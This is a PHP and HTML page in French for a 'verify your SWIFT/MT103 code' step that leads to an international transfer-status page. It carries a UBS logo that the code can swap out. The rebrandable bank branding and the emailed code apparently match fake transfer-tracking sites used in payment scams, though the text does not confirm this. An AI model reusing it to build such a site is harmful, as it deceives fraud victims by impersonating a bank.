<?php
// 🔐 Démarrer la session
session_start();
require_once 'config.php';
require_once 'init_lang.php';

$message = trans('saisissez_code');

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $code = trim($_POST["code"] ?? '');

    try {
        $stmt = $pdo->prepare("SELECT * FROM virements WHERE code_swift = ?");
        $stmt->execute([$code]);
        $virement = $stmt->fetch();

        if ($virement) {
            $_SESSION['authentifie'] = true;
            $_SESSION['code_utilise'] = $code;
            header("Location: statut-virement.php");
            exit;
        } else {
            $message = trans('code_incorrect');
        }
    } catch (Exception $e) {
        $message = trans('erreur_verification');
    }
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification du code</title>
    <link rel="stylesheet" href="verification.css?v=2">
</head>
<body>
    <div class="page-wrapper">
        <section class="verification-panel">
            <div class="header-row">
                <div class="logo-frame logo-left">
                    <img src="<?= htmlspecialchars(getActiveLogo()) ?>" alt="Logo UBS">
                </div>
                <div class="meta-group meta-right">
                    <div class="meta-title"><a href="index.php">Accueil</a></div>
                    <div class="meta-subtitle">FR</div>
                </div>
            </div>

            <div class="content-block">
                <p class="intro-text">Renseignez votre code SWIFT (MT103) ou la référence de transaction pour consulter l'état de votre virement international en temps réel.</p>

                <h1 class="page-title">Référence SWIFT / MT103</h1>
                <p class="page-subtitle">Saisissez votre code reçu par Email</p>

                <?php if (!empty($message)) : ?>
                    <div class="message-box"><?= htmlspecialchars($message) ?></div>
                <?php endif; ?>

                <form method="POST" class="verify-form">
                    <div class="form-row">
                        <input type="text" name="code" class="verify-input" placeholder="Ex: TRXXXXXXXX" required>
                        <button type="submit" class="verify-button"><?= trans('verifier') ?></button>
                    </div>
                </form>
            </div>
        </section>

        <p class="hero-footer">Vos données sont chiffrées et protégées. Assistance 24/7 disponible via le chat. Besoin d'aide pour votre virement ?</p>
    </div>
</body>
</html>
